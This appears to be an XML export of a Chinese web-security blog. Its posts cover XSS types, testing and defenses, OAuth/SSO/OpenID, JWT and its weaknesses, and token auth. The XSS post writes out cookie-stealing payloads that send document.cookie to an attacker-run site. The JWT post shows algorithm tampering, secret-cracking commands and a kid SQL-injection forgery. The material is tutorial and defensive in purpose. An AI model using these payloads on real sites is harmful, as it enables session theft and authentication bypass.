    <content type="text"><![CDATA[一、JavaScript相关语法（一）基础语法123写在[removed][removed]标签中变量定义：var xxx.的用处：连接字符（二）wiondow.open()：是window对象中的open()方法12345而window对象是javascript中的顶层对象，代表一个浏览器窗口 在&amp;lt;body&gt;或&amp;lt;frameset&gt;每次出现时被自动创建 open()方法用于打开一个新的浏览器窗口或查找一个已命名的窗口 （三）document.password.pass.value 123document是javascript里面的文档对象，里面含有很多的属性和方法，而value值就是属性。在这里是获得password.password.pass.value的值。 （四）javascript alert() 12警示对话框 函数括号内的文本信息显示在对话框中，把它称为警示对话框，要显示的信息放置在括号内，该对画框包含一个确认"确认"按钮。用户阅读完之后所显示的信息后，只需要点击该按钮就可以关闭对话框，在这里就是一个弹出框。 二、XSS定义 跨站脚本攻击(Cross Site Scripting)，缩写为XSS。 恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML 攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容 三、 XSS的原理 攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码） 诱使受害者打开受到攻击的服务器URL 受害者在Web浏览器中打开URL，恶意脚本执行 四、XSS的攻击方式（一）反射型 DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。 发送请求时，XSS代码出现在URL中(反射型的典型特征)，作为输入提交到服务器端，服务器端解析后响应(search中包含XSS代码，可以是js或者HTML或者CSS)，XSS代码随着响应内容一起传回浏览器，最后浏览器解析执行XSS代码，这个过程像一个反射，所以叫做反射型XSS。 注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的而称为非持久型XSS，则是因为这种攻击方式具有一次性。 场景一 当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似： 12345678910&lt;%@ page language="java"contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt;&lt;!DOCTYPEhtmlPUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;XSS测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;页面内容：&lt;%=request.getParameter("content")%&gt;&lt;/body&gt;&lt;/html&gt; 我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为 1http://www.a.com?content=&lt;script&gt; window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt; 当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！ 这个过程中， 受害者只有Tom自己。那当我在浏览器输入 1a.com?content=&lt;script&gt;alert(“xss”)&lt;/script&amp; gt; 浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己。 （二）存储型（Stored XSS） 存储型XSS和反射型的XSS差别就在于，存储型的XSS提交的代码会存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。 这种攻击多见于论坛，攻击者在发帖的过程中 场景二 a.com可以发文章， 我登录后在a.com中发布了一篇文章，文章中包含了恶意代码： 1&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt; /script&gt; 保存文章。 这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务 器上，攻击成功！这个过程中，受害者是多个人。 Stored XSS漏洞危害性更大，危害面更广 （三）DOM（Document object model）型XSS 其实是一种特殊类型的反射型XSS，它是基于DOM文档对象的一种漏洞。DOM型XSS是基于js上的。不需要与服务器进行交互 传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。所以，受客户端浏览器的脚本代码所影响。 客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。 换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。 另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。 五、XSS漏洞测试（一）方法一 查看代码，查找关键的变量, 客户端将数据传送给Web 服务端一般通过三种方式 Querystring Form表单 cookie 例如在ASP的程序中，通过Request对象获取客户端的变量 12345&lt;% strUserCode = Request.QueryString(“code”); strUser = Request.Form(“USER”); strID = Request.Cookies(“ID”);%&gt; 假如变量没有经过htmlEncode处理， 那么这个变量就存在一个XSS漏洞 （二）方法二 准备测试脚本 123"/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--"onclick="alert(document.cookie) 在网页中的Textbox或者其他能输入数据的地方，输入这些测试脚本， 看能不能弹出对话框，能弹出的话说明存在XSS漏洞 在URL中查看有那些变量通过URL把值传给Web服务器， 把这些变量的值退换成我们的测试的脚本。 然后看我们的脚本是否能执行 （三）方法三 自动化测试XSS漏洞或者工具测试 现在已经有很多XSS扫描工具了。 实现XSS自动化测试非常简单，只需要用HttpWebRequest类。 把包含xss 测试脚本。发送给Web服务器。 然后查看HttpWebResponse中，我们的XSS测试脚本是否已经注入进去了 六、攻击方式常见容易出现XSS漏洞的地方1.数据交互的地方 get、post、cookies、headers 反馈与浏览 富文本编辑器 各类标签插入和自定义 2.数据输出的地方 用户资料 关键词、标签、说明 文件上传 反射型XSS测试点：网站的搜索栏、用户登录入口、输入表单等地方 存储型XSS测试点：论坛、博客、留言板、网站的留言、评论、日志等交互处 （一）反射性XSS 1.常见注入点 网站的搜索栏、用户登录入口、输入表单等地方 2.攻击方式 通过各种方式将包含XSS代码的恶意链接发送给目标用户 比如：邮件、吸引眼球的图片…. （二）存储型XSS 1.常见注入点 论坛、博客、留言板、网站的留言、评论、日志等交互处 2.攻击方式 在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。 随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行 （三）DOM型XSS 1.常见注入点 通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器d端交互，它只发生在客户端处理数据的阶段。 2.攻击方式 用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。 七、XSS安全性分析（一）首先要明确的是，在受害者的浏览器中执行脚本的能力算不上特别恶意 js的执行环境受到严格限制并只有非常有限的权限访问用户的文件和操作系统。 事实上，现在就可以打开浏览器的脚本控制台立刻执行任何你想执行的脚本，几乎不可能对你的电脑造成任何的伤害。 但是恶意脚本有以下的权限 js有权访问一些用户的敏感信息，比如cookie js能够通过XMLHttpRequest或者其他一些机制发送带有任何内容的HTTP请求到任何地址 js能够通过DOM操作方法对当前页面的HTML做任意修改 （二）这种在其他用户的浏览器中执行任意脚本的权限，赋予了攻击者有能力发动以下几类攻击 1.Cookie窃取：攻击者能够通过document.cookie访问受害者与网站关联的cookie，然后传送到攻击者自己的服务器，接着从这些cookie中提取敏感信息，如Session ID。 2.记录用户行为（Keylogging）：攻击者可以使用 addEventListener方法注册用于监听键盘事件的回调函数，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。 3.钓鱼网站（Phishing）：攻击者可以通过修改DOM在页面上插入一个假的登陆框，也可以把表单的action属性指向他自己的服务器地址，然后欺骗用户提交自己的敏感信息 4.利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。 5.利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。 6.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。 7.修改网页内容 8.网站挂马 9.XSS蠕虫 10.利用网站重定向 尽管这些攻击类型大不相同，但都有一条重要的相似之处： 因为攻击者把代码注入进的页面是由网站的，所以恶意脚本都是在网站的上下文环境中执行，这就意味着恶意代码被当作网站提供的其他正常脚本一样对待 这些事实都在强调一个关键性问题：如果攻击者能够借助你的网站在另一个用户的浏览器中执行任意脚本，那么你网站的安全性已经无从谈起了 八、XSS的防御措施（一）调用函数 对于用户提交的数据可以通过调用函数进行过滤 htmlspecialchars()函数将输出的内容进行HTML的编码，效果最好 str_replace()函数可以将指定的字符串转换为其他字符串的，但是会被绕过 （二）使用XSS Filter（1）输入过滤 输入验证（客户端）：前端JS过滤，如检测最大长度、是否只有合法字符、格式是否符合要求、数字是否在指定的范围内。 缺点：容易被修改掉。 数据消毒（服务器端）：过滤敏感字符（可以和SQL注入的一同过滤） 如：&lt; &gt; javascript ‘ “ &amp; # expression等… （2） 输出编码（服务器端） 可以使用HTML编码 123PHP的htmlspecialchars()函数ASP的Server.HTMLEncode()函数ASP.NET的Server.HtmlEncode()函数 用对应的HTML实体替代字面量字符，此时浏览器会将恶意代码当作HTML文档的内容而不是结构加以处理 常见恶意字符的HTML编码（显示、实体名字、实体编号）： 12345&lt; &amp;lt; &amp;#60；&gt; &amp;gt; &amp;#62；&amp; &amp;amp; &amp;#38；“ &amp;quot; &amp;#34；‘ &amp;#39; （三）白名单和黑名单结合（四）Noscript Firefox的一款免费的开源插件，默认禁止所有脚本，但是可以通过自定义设置允许通过的脚本 （五）Anti_XSS 提供大量的编码函数用于处理用户的输入，实现白名单机制和输出转义 （六）HttpOnly 攻击者通过XSS漏洞执行JS中的document.cookie方法来窃取用户的cookie信息。Web应用程序在Set-Cookie时将其属性设为HttpOnly即可避免Cookie被客户端JS存取，也可以保护用户的Cookie信息不被盗取。 PHP设置HttpOnly的方法： 123（1） 修改php.ini文件，设置其值为1或TRUE；（2） setcookie()函数和setrawcookie()函数的第七个参数（3）在PHP代码中开启 （七）Web安全编码规范 对敏感字符转义、URL属性进行相应的规定等 （八）尽量使用WAF（九）防御DOM型XSS DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。 其防御在于： （1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现； （2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到则进行JS编码。 （十）ASP.NET中的XSS安全机制 ASP.NET中有防范XSS的机制，对提交的表单会自动检查是否存在XSS，当用户试图输入XSS代码的时候，ASP.NET会抛出一个错误 很多程序员对安全没有概念， 甚至不知道有XSS的存在。 ASP.NET在这一点上做到默认安全。 这样的话就算是没有安全意识的程序员也能写出一个”较安全的网站“。 如果想禁止这个安全特性， 可以通过 1&lt;%@ Page validateRequest=“false” %&gt;]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web认证授权4—OAuth、SSO、OpenID.md]]></title>
    <url>%2F2018%2F07%2F07%2FWeb%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%834%E2%80%94OAuth%E3%80%81%20SSO%E3%80%81OpenID%2F</url>
    <content type="text"><![CDATA[一、OAuth OAuth（开放授权）是一个开放的授权标准，允许用户让第三方应用访问该用户在某一web服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。 （一）原理 思路：OAuth在”客户端”与”服务提供商”之间，设置了一个授权层（authorization layer）。”客户端”登录授权层，在授权层拿到Token（Token携带权限范围和时间等），再去访问目标网站 OAuth允许用户提供一个令牌（Token），而不是用户名和密码来访问他们存放在特定服务提供者的数据。 每一个令牌授权一个特定的第三方系统（例如，视频编辑网站)在特定的时段（例如，接下来的2小时内）内访问特定的资源（例如仅仅是某一相册中的视频）。 这样，OAuth让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息，而非所有内容 （二）四种授权模式123456789101112授权码模式（authorization code）：功能最完整、流程最严密的授权模式。也是最常用的授权模式。其通过客户端的后台服务器，与"服务提供商"的认证服务器进行互动。简化模式（implicit）：不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了"授权码"这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。密码模式（resource owner password credentials）：用户向客户端提供自己的用户名和密码。客户端使用这些信息，向"服务商提供商"索要授权。在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。这通常用在用户对客户端高度信任的情况下，比如客户端是操作系统的一部分，或者由一个著名公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才能考虑使用这种模式。客户端模式（client credentials）：指客户端以自己的名义，而不是以用户的名义，向"服务提供商"进行认证。严格地说，客户端模式并不属于OAuth框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求"服务提供商"提供服务，其实不存在授权问题。 （三）安全性问题：关注四个参数1234567redirect_url:回调域名client:必须与域名绑定state:防止CSRFscope:权限范围 二、SSO：单点登录 在多个应用系统中，用户只需登陆一次，就可以访问所有相互信任的应用。 通常公司内部会有非常多的工具平台供大家使用，比如人力资源，代码管理，日志监控，预算申请等等。如果每一个平台都实现自己的用户体系的话无疑是巨大的浪费，所以公司内部会有一套公用的用户体系，用户只要登陆之后，就能够访问所有的系统。 SSO 是一类解决方案的统称，而在具体的实施方面，有两种策略可供选择： SAML 2.0 OAuth 2.0 三、OpenID 某些站点看到允许以 OpenID 的方式登陆，其实也就是以 Facebook 账号或者 Google 账号登陆站点 这听上去似乎和 OAuth 很像。但本质上来说它们是截然不同用户的两个东西： OpenID 只用于身份认证（Authentication），允许你以同一个账户在多个网站登陆。它仅仅是为你的合法身份背书，当你以 Facebook 账号登陆某个站点之后，该站点无权访问你的在 Facebook 上的数据 OAuth 用于授权（Authorisation），允许被授权方访问授权方的用户数据]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>认证授权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web认证授权3—JWT Auth及其安全问题]]></title>
    <url>%2F2018%2F07%2F06%2FWeb%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%833%E2%80%94JWT%20Auth%2F</url>
    <content type="text"><![CDATA[一、起源 在前后端分离的应用中，后端为Model层，为前端提供数据访问的API。为了保证数据安全可靠地在用户与服务端之间传输，实现服务端的认证就极为必要。 常见的服务端认证方法有： 基于Cookie的认证：session 每次请求都带上cookie，取出相应字段并与服务端进行对比，以实现身份的认证（具有CORS问题） 基于Token的认证：Json Web Toekn 请求在HTTP的头部（或其他位置）附上token，由服务器check signature来实现 JWT不一定完全取代Cookie-Session Auth体制，其也存在缺点。JWT更适合用于认证签名的过程，更适合一次性操作的认证。 二、什么是Json Web Token？ JWT是一套开放的Json标准，定义了一套简介且URL安全的方案，以安全地在客户端和服务器之间传输Json格式的信息 三、JWT的特点 JWT默认不加密。也可以加密，生产原始Token以后，可以用密钥再加密一次 JWT不加密情况下，不能将秘密数据写入JWT （一）自身优点 体积小（一串字符串）：传输速度快 传输方式多样 HTTP头部（推荐）（Authorization: Bearer ） URL POST参数 … 严谨的结构化 payload中包含了所有与用户相关的信息，且支持定制。故，如果用户访问路由、有效期等信息则无需再去连接数据库验证信息的有效性（避免了传统session的CORS问题） 支持跨域验证：多应用于单点登录 （二）相比较与传统的服务端验证 1.充分以来无状态API，契合RESTful设计原则（无状态的HTTP） 状态：请求的状态是 client 与 server 交互过程中，保存下来的相关信息，客户端的保存page/request/session/application 或者全局作用域中，而 server 的一般存在 session 中 有状态的API：server 保存了 client 的请求状态， server 通过 client 传递的 sessionID 在其 session 作用域内找到之前交互的信息并应答 无状态 API：无状态是 RESTful 架构设计的一个非常重要的原则。无状态 API 的每一个请求都是独立的，它要求客户端保存所有需要的认证信息，每次发请求都要带上自己的状态，以 url 的形式提交包含 cookies 等状态的数据 JWT 的设计契合无状态原则：用户登录之后，服务器会返回一串 token 并保存在本地，在这之后的服务器访问都要带上这串 token，来获得访问相关路由、服务及资源的权限。比如单点登录就比较多地使用了 JWT，因为它的体积小，并且经过简单处理（使用 HTTP 头带上 Bearer 属性 + token ）就可以支持跨域操作 2.易于实现CDN，将静态资源分布式管理 传统的session验证中，服务端必须保存sessionID，用于与用户传过来的cookie验证。 而一开始 sessionID 只会保存在一台服务器上，所以只能由一台 server 应答，就算其他服务器有空闲也无法应答，无法充分利用到分布式服务器的优点。 JWT 依赖的是在客户端本地保存验证信息，不需要利用服务器保存的信息来验证，所以任意一台服务器都可以应答，服务器的资源也能被较好地利用。 3.验证解耦，随处生成 无需使用特定的身份验证方案，只要拥有生成 token 所需的验证信息，在何处都可以调用相应接口生成 token，无需繁琐的耦合的验证操作，可谓是一次生成，永久使用 4.比 cookie 更支持原生移动端应用 原生的移动应用对 cookie 与 session 的支持不够好，而对 token 的方式支持较好 （三）缺点 1.权限签发在有限期内始终有效： 由于服务器不保存Session的状态，因此无法在使用过程中废止某个Token或者更改Token权限。也就是说，一旦JWT签发了，在到期前会始终有效，除非服务器部署额外的逻辑，即不易应对数据过期 2.本身包含了认证信息，一旦泄漏任何人都可以获得令牌的权限。（如果保存在Local Storage中容易受到XSS攻击） 为了减少盗用： JWT的有效期应该设置比较短，对于一些重要的权限，使用时应该再次对用户进行认证。 JWT使用HTTPS协议进行传输 四、JWT工作原理 登录过程 请求认证 1.client使用自己的账号密码发送post请求login 2.因为首次接触，服务器会校验账号与密码是否合法，如果一致，则根据密钥生成一个token并返回 3.Browser收到后，client收到这个token并保存在本地 4.如果后面需要访问一个受保护的路由或资源时，只要附加上token（通常使用Header的Authorization属性）发送到服务器，然后服务器来检查这个token是否有效并作出响应即可 五、组成结构 （一）header 用于描述元信息，例如：产生signature的算法： typ：表示JWT alg：指定使用哪种一种密码算法来创建signature（默认时HS256） 1234&#123; "typ": "JWT", "alg": "HS256" &#125; （二）payload 携带希望向服务端传递的信息 可以添加官方字段(field(claims)) iss(lssuer)：签发人 sub(Subject)：主题 exp(Expiration time)：过期时间 aud(audience)：受众 nbf(Not Before)：生效时间 iat(Issued At)：签发时间 jti(JWT ID)：编号 也可以添加自定义字段 userID … 123456789&#123; "userId": "b08f86af-35da-48f2-8fab-cef3904660bd" "sub": "1", //该JWT所面向的用户 "iss": "http://localhost:8000/auth/login", //该JWT的签发者 "iat": , //iat(issued at): 在什么时候签发的token "exp": , //exp(expires): token什么时候过期 "nbf": , //nbf(not before)：token在此时间之前不能被接收处理 "jti": "" //JWT ID为web token提供唯一标识&#125; （三）signature 签名，用于认证 创建签名过程： 从接口服务端拿到密钥，假设为secret 将header进行base64编码+payload进行base64编码 12// $SignatureHS256(Base64(Header) + "." + Base64(Payload), secretKey) 用私钥对签名进行加密，接收方（即服务器端）用公钥进行解密认证 （四）JWT Header、Payload、Signature三部分Base64URL算法编码后以”.”分割，拼接成一个字符串 Base64URL：（JWT最为令牌有些场合需要用到URL） 类似Base64，但稍有不同。Base64有三个字符”+”、”/“、”=”，在URL里面有特殊含义。所以要被替换掉： “=”被省略 “+”替换成”-“ “/“替换成”_” 12//JWTJWT = Base64(Header) + "." + Base64(Payload) + "." + $Signature 假设原始Json结构是： 123456789//Header&#123; "typ": "JWT", "alg": "HS256"&#125;// Payload&#123; "userID": "b08f86af-35da-48f2-8fab-cef3904660bd" &#125; 如果密钥是secret，那么最终的JWT的结果是： 1eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiJiMDhmODZhZi0zNWRhLTQ4ZjItOGZhYi1jZWYzOTA0NjYwYmQifQ.-xN_h82PHVTCMA9vdoHrcZxH-x5mb11y1537t3rGzcM 可以在：https://jwt.io/上检验这个结果 六、应用 客户端收到服务器返回的JWT，可以存储在Cookie里面，也可以储存在LocalStorage 此后，客户端每次与服务端通信，都带上这个JWT。 携带在Cookie里：不能跨域 携带在HTTP头Authorization里：可以跨域 JWT适合一次性的命令认证，颁发一个有效期极短的JWT，即使暴露了危险也很小，由于每次操作都会生成新的JWT，因此也没必要保存JWT，真正实现无状态。 （一）认证 JWT 的目的不是为了隐藏或者保密数据，而是为了确保数据确实来自被授权的人创建的（不被篡改） header和payload完全可知 签名-&gt;认证 （二）接口调用 认证是否有权利来调用API，通常在API调用请求的HTTP Header中附上JWT （三）有状态会话 HTTP无状态，所以客户端和服务端需要解决的问题是如何让他们之间变得有状态。 例如：只有是登录状态的用户才有权调用某些接口，一般记住用户登录状态传统方法是session机制 而JWT理论上可以代替session机制，且有两点好处 1.用户不需要提前登录 2.后端不需要记录用户的登录信息 客户端的本地保存一份合法的 JWT, 当用户需要调用接口时，附带上该合法的 JWT，每一次调用接口，后端都使用请求中附带的 JWT 做一次合法性的验证。这样也间接达到了认证用户的目的 （四）分布式站点的单点登录（SSO）七、JWT Auth安全问题（一）密码算法篡改攻击 1.修改算法为none(低版本) 若后端支持none算法，则可以把alg字段修改为none 2.修改算法RS256为HS256 RS256是非对称加密算法 HS256是对称加密算法 如果JWT内部函数支持的RS256算法又同时支持HS256算法 已知公钥 把算法改成HS256，后端就会把公钥当作密钥来加密 （二）爆破秘钥 已知道加密算法，密钥太短，通过暴力破解的方式，可以得到密钥 工具： JohnTheRipper（https://github.com/magnumripper/JohnTheRipper） 123456git clone https://github.com/magnumripper/JohnTheRippercd JohnTheRipper/src./configuremake -s clean &amp;&amp; make -sj4cd ../run./john jwt.txt c-jwt-cracker（https://github.com/brendan-rius/c-jwt-cracker） 123makemake OPENSSL=/usr/local/opt/openssl/include OPENSSL_LIB=-L/usr/local/opt/openssl/lib./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE （三）伪造JWT 1.敏感信息泄露问题： JWT以base64URL编码传输，数据基本上等于明文传输，如果有重要内容，则可以base64解码得到敏感信息 2.信息可控问题： Kid可控：ket的值在数据库中，数据库代码为： 12sql="select * from table where kid=$kid "res=exec(sql) 所以可以构造以下语句，使得res=1，然后用1作为秘钥来签名加密，可以顺利伪造JWT。 1kid = 0 union select 1 公钥地址可控（HITB-CTF-2017）：利用OPENSSL生成公钥、私钥对，利用注册写一个paste，内容为公钥，利用下载功能获取到公钥的保存地址。 接下来用 https://jwt.io/ 来生成伪造的jwt。由于要伪造admin，所以sub字段要修改为admin。在公钥和私钥部分填上生成的公钥和私钥，在头部kid字段填上公钥的地址。 得到伪造的JWT，之后每次操作，把Toekn替换成伪造的JWT操作。 （四）重放攻击（五）MITM（Man-In-The-Middel）Attacks]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>认证授权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web认证授权2—Token Auth]]></title>
    <url>%2F2018%2F07%2F04%2FWeb%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%832%E2%80%94Token%20Auth%2F</url>
    <content type="text"><![CDATA[一、Token Token=令牌。服务端生成的一串字符串。是客户端进行请求的一个标识，用来作为访问资源的凭据。 类似于临时的证书签名, 并且是一种服务端无状态的认证方式，非常适合于 REST API 的场景。所谓无状态就是服务端并不会保存身份认证相关的数据。 二、Token组成 UID：用户唯一的身份标识 TIME：时间戳 Sign：签名（token的前几位以哈希算法压缩成的一定长度的十六进制字符串） 固定参数(可选): 将一些常用的固定参数加入到 token 中是为了避免重复查库 三、Token分类 refresh token 负责身份认证 access token 负责请求资源 第一次获取Token的流程 1.首先需要向 Google API 注册应用程序，注册完毕之后会拿到认证信息（credentials）包括ID 和 secret。不是所有的程序类型都有 secret。 2.接下来就要向 Google 请求 access token。如果想访问的是用户资源，这里就会提醒用户进行授权。 3.如果用户授权完毕。Google 就会返回 access token。又或者是返回授权代码（authorization code），再通过代码取得 access token (注意：第三步通过code兑换access token的过程中Google 并不会仅仅返回 access token，还会返回额外的信息，这其中和之后更新相关的就是 refresh token。一旦 access token 过期，就可以通过 refresh token 再次请求 access token。) 4.token 获取到之后，就能够带上 token 访问 API 了 ​ （一）Access Token 有效期限，过期就要重新获取，可通过refresh token重新获取 （二）Refresh Token 如果 refesh token 也过期了怎么办？这就需要用户重新登陆授权了 虽然 refresh token 和 access token 都由 IdP 发出，但是 access token 还要和 SP 进行数据交换，如果公用的话这样就会有身份泄露的可能。并且 IdP 和 SP 可能是完全不同的服务提供的。而在第一小节中之所以没有这样的顾虑是因为 IdP 和 SP 都是 Google 四、Token Auth原理 1.客户端使用用户名和密码请求登录 2.服务端收到请求，验证用户名和密码 3.验证成功后，服务端会生成一个Token，然后把Token发送给客户端 4.客户端收到Token后把它保存起来（不需要Session一样存储到服务端），可以放在Cookie或者Local Storage（本地存储） 5.客户端每次想服务端发送请求的时候都需要带上服务端发给的Token 6.服务端收到请求，然后去验证客户端请求里面带着的Token，如果验证成功，就向客户端返回请求的数据。 五、Token Auth的Token选择分类（一）设备的MAC地址作为Token 客户端：客户端在登录时获取设备的MAC地址，将其作为参数传递到服务端 服务端：服务端接收到该参数后，便用一个变量来接收，同时将其作为token保存在数据库，并将该token设置到session中。客户端每次请求的时候都要统一拦截，将客户端传递的token和服务器端session中的token进行对比，相同则登录成功，不同则拒绝 优点： 1.统一了客户端与服务端的唯一标识，并且保证每一个设备拥有唯一的标识。 2.客户端无需重新登录，只要登录一次以后一直可以使用，对于超时的问题由服务端进行处理 缺点： 服务器端需要保存mac地址 （二）Session ID作为Token 客户端：客户端携带用户名和密码登录 服务端：接收到用户名和密码后进行校验，正确就将本地获取的Session ID作为token返回给客户端，客户端以后只需带上请求的数据即可 优点： 方便，不需要存储数据 缺点： 当Session过期时，客户端必须重新登录才能请求数据 （三）MAC和Session ID同时作为Token 用于保密性比较高的应用 六、Token Auth的特点 token是无状态的，用户进行任何操作时，都需要带上一个token token比cookie先进，更能适用于跨平台，移动平台等 token的存在形式有很多种，header/requestbody/url 都可以 token只需要存在客户端，服务器在收到数据后，进行解析 （一）优点 支持跨域访问：Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户认证信息通过HTTP头传输。 无状态(也称：服务端可扩展行)：Token机制在服务端不需要存储session信息，因为Token 自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息。 *更适用CDN： *可以通过内容分发网络请求服务端的所有资料（如：javascript，HTML,图片等），而服务端只要提供API即可。 *去耦： *不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用的时候，你可以进行Token生成调用即可。 *更适用于移动应用： *当客户端是一个原生平台（iOS, Android，Windows 8等）时，Cookie是不被支持的（你需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多。 防止CSRF：因为不再依赖于Cookie，所以就不需要考虑对CSRF（跨站请求伪造）的防范。 性能： 一次网络往返时间（通过数据库查询session信息）总比做一次HMACSHA256计算 的Token验证和解析要费时得多。 不需要为登录页面做特殊处理： 如果使用Protractor做功能测试的时候，不再需要为登录页面做特殊处理。 基于标准化：API可以采用标准化的 JSON Web Token (JWT)。这个标准已经存在多个后端库（.NET, Ruby, Java,Python,PHP）和多家公司的支持（如:Firebase,Google, Microsoft）。 （二）缺点七、TokenAuth携带token的方式 HTTP Header URL参数 提供的类库 八、Token的存储 数据库 查询时间长 易丢失，重新认证麻烦 内存 查询速度快 不需太担心内存占用，token就算32位且用户百万千万级也占用不了太多内存 九、Token的加密 对称加密：在存储的时候把token进行对称加密存储，用到的时候再解密 非对称加密/签名算法：签名方式（请求URL、时间戳、Token三者合并）通过签名算法签名 网络层面上Token使用明文传输的话是非常危险的，所以一定要使用HTTPS协议 十、Token Auth应用（一）Web认证（且防止CSRF）（二）APP认证 1.用户在登录APP时，APP端发送加密的用户名和密码到服务器 2.服务器验证用户名和密码，如果验证成功，就会生成相应位数的字符产作为token存储到服务器中，并且将该token返回给APP端。 3.以后APP再次请求时，凡是需要验证的地方都要带上该token，然后服务器端验证token。其中，服务器上会给token设置一个有效期，每次APP请求的时候都验证token和有效期。 成功：返回所需要的结果 失败：返回错误信息，让用户重新登录。]]></content>
      <categories>
        <category>WEB安全</category>
        <category>Browser端安全</category>
      </categories>
      <tags>
        <tag>认证授权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web认证授权1—Cookie/Seesion Auth]]></title>
    <url>%2F2018%2F07%2F03%2FWeb%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%831%E2%80%94Cookie%3ASeesion%20Auth%2F</url>
